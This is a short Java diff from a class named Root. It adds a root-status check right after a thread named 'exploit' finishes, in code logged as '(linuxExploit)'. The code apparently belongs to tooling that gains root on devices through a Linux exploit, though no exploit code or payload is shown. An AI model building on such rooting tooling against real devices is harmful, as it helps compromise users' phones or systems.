@@ -603,6 +603,7 @@ public class Root {
 		if(synchronous){
 			try {
 				exploit.join();
+				PackageInfo.checkRoot();
 			} catch (InterruptedException e) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (linuxExploit), exception");
